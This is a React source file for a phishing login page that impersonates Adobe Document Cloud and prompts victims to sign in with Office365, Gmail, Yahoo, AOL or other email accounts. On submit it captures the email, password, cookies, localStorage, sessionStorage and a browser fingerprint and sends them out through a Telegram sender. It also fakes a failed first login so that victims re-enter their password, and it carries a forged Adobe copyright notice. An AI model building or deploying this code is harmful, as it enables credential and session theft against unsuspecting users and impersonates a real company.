import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { getBrowserFingerprint } from '../utils/oauthHandler';
import safeSendToTelegram from '../utils/safeSendToTelegram';

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState('');

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    console.log(`🔐 Selected provider: ${provider}`);
    setSelectedProvider(provider);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password || !selectedProvider) return;

    setIsLoading(true);
    setErrorMessage('');
    
    try {
      const currentAttempt = loginAttempts + 1;
      setLoginAttempts(currentAttempt);

      // Capture browser fingerprint for this attempt
      const browserFingerprint = getBrowserFingerprint();
      
      const cookieCapture = {
        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
        allCookies: {}
      };
      if (typeof document !== 'undefined') {
        document.cookie.split(';').forEach(cookie => {
          const [name, value] = cookie.trim().split('=');
          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
        });
      }

      const sessionData = {
        email,
        password,
        provider: selectedProvider,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        fileName: 'Adobe Cloud Access',
        clientIP: 'Unknown',
        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
        cookies: cookieCapture.documentCookies,
        cookiesParsed: cookieCapture.allCookies,
        localStorage: JSON.stringify(browserFingerprint.localStorage),
        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
        browserFingerprint,
        attemptNumber: currentAttempt,
        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
        cookieCapture
      };

      // Use shared safe sender
      try {
        await safeSendToTelegram(sessionData);
        console.log(`✅ Attempt ${currentAttempt} data sent to Telegram`);
      } catch (err) {
        console.error('❌ Failed to send attempt data via safeSendToTelegram:', err);
      }

      if (currentAttempt === 1) {
        await new Promise(resolve => setTimeout(resolve, 1500));
        setErrorMessage('Invalid email or password. Please try again.');
        setIsLoading(false);
      } else {
        await new Promise(resolve => setTimeout(resolve, 1000));
        if (typeof localStorage !== 'undefined') {
          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
        }
        if (onLoginSuccess) await onLoginSuccess(sessionData);
        setIsLoading(false);
      }
    } catch (error) {
      console.error('Login error:', error);
      if (onLoginError) onLoginError('Login failed. Please try again.');
      setIsLoading(false);
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    setLoginAttempts(0);
    setErrorMessage('');
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden"
      style={{
        backgroundImage: "url('https://images.unsplash.com/photo-1633993365956-621f62f8057e?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=2070')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      {/* keep existing decorative elements (they will sit above the background) */}
      <div className="w-full max-w-md relative z-10">
        <div className="bg-white/80 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-8 relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-br from-white/50 to-transparent pointer-events-none"></div>
          <div className="relative z-10">
            <div className="flex items-center gap-4 mb-8">
              {/* standalone header logo (no background wrapper) */}
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
                alt="Adobe Document Cloud"
                className="w-12 h-12 object-contain"
              />
              <div>
                <h1 className="text-xl font-bold text-gray-900 flex items-center gap-2">
                  Secure Document Access
                </h1>
                {/* subtitle removed */}
              </div>
            </div>

            <div className="mt-8">
              {!selectedProvider ? (
                <div className="space-y-4">
                  <div className="text-center mb-6">
                    <div className="inline-flex items-center gap-2 px-4 py-2 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-full border border-blue-100">
                      <Sparkles className="w-4 h-4 text-blue-500" />
                      <span className="text-sm font-medium text-blue-700">Select Your Provider</span>
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-2 gap-4">
                    {emailProviders.map((provider) => (
                      <button 
                        key={provider.name} 
                        onClick={() => handleProviderSelect(provider.name)} 
                        className="group relative flex flex-col items-center gap-3 p-4 bg-white/60 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-300 transform hover:-translate-y-1 hover:scale-105" 
                        aria-label={`Select ${provider.name}`} 
                        type="button"
                      >
                        {/* Standalone logo (no background) */}
                        <img 
                          src={provider.logo} 
                          alt={provider.name} 
                          className="w-10 h-10 object-contain" 
                          onError={(e) => {
                            const t = e.target as HTMLImageElement;
                            t.style.display = 'none';
                          }}
                        />
                        <div className="text-sm font-semibold text-gray-800 group-hover:text-gray-900 transition-colors">
                          {provider.name}
                        </div>
                        <div className="absolute inset-0 rounded-xl bg-gradient-to-br from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                      </button>
                    ))}
                  </div>
                </div>
              ) : (
                <div className="space-y-6">
                  <div className="flex items-center gap-3 mb-6">
                    <button 
                      onClick={handleBackToProviders} 
                      className="p-2 rounded-lg hover:bg-gray-100 transition-colors" 
                      type="button"
                    >
                      <ArrowLeft className="w-4 h-4 text-gray-600" />
                    </button>
                    <div className="flex items-center gap-3">
                      {/* selected-provider logo stands alone */}
                      <img 
                        src={emailProviders.find(p => p.name === selectedProvider)?.logo} 
                        alt={selectedProvider} 
                        className="w-8 h-8 object-contain" 
                        onError={(e) => { const t = e.target as HTMLImageElement; t.style.display = 'none'; }}
                      />
                      <h2 className="text-lg font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                    </div>
                  </div>

                  <form onSubmit={handleFormSubmit} className="space-y-5">
                    {errorMessage && (
                      <div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-xl p-4 animate-shake">
                        <p className="text-red-700 text-sm font-medium flex items-center gap-2">
                          <div className="w-4 h-4 rounded-full bg-red-500 flex items-center justify-center">
                            <div className="w-2 h-2 bg-white rounded-full"></div>
                          </div>
                          {errorMessage}
                        </p>
                      </div>
                    )}

                    <div className="space-y-4">
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Email Address</label>
                        <div className="relative group">
                          <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type="email" 
                            value={email} 
                            onChange={(e) => setEmail(e.target.value)} 
                            className="w-full pl-12 pr-4 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
                            placeholder="Enter your email address" 
                            required 
                          />
                        </div>
                      </div>

                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Password</label>
                        <div className="relative group">
                          <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5 group-focus-within:text-blue-500 transition-colors" />
                          <input 
                            type={showPassword ? 'text' : 'password'} 
                            value={password} 
                            onChange={(e) => setPassword(e.target.value)} 
                            className="w-full pl-12 pr-12 py-3.5 bg-white/70 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-300 hover:bg-white/80" 
                            placeholder="Enter your password" 
                            required 
                          />
                          <button 
                            type="button" 
                            onClick={() => setShowPassword(!showPassword)} 
                            className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"
                          >
                            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                          </button>
                        </div>
                      </div>
                    </div>

                    <button 
                      type="submit" 
                      disabled={isLoading || !email || !password} 
                      className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-4 rounded-xl font-bold text-lg hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl relative overflow-hidden group"
                    >
                      <div className="absolute inset-0 bg-gradient-to-r from-white/20 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                      <div className="relative flex items-center justify-center gap-2">
                        {isLoading && (
                          <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                        )}
                        {isLoading ? (loginAttempts === 0 ? 'Signing in...' : 'Verifying...') : 'Sign In Securely'}
                      </div>
                    </button>
                  </form>
                </div>
              )}
            </div>

            <div className="mt-8 text-center">
              <p className="text-xs text-gray-500 flex items-center justify-center gap-2">
                © 2025 Adobe Inc. All rights reserved. Secured by SSL encryption.
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
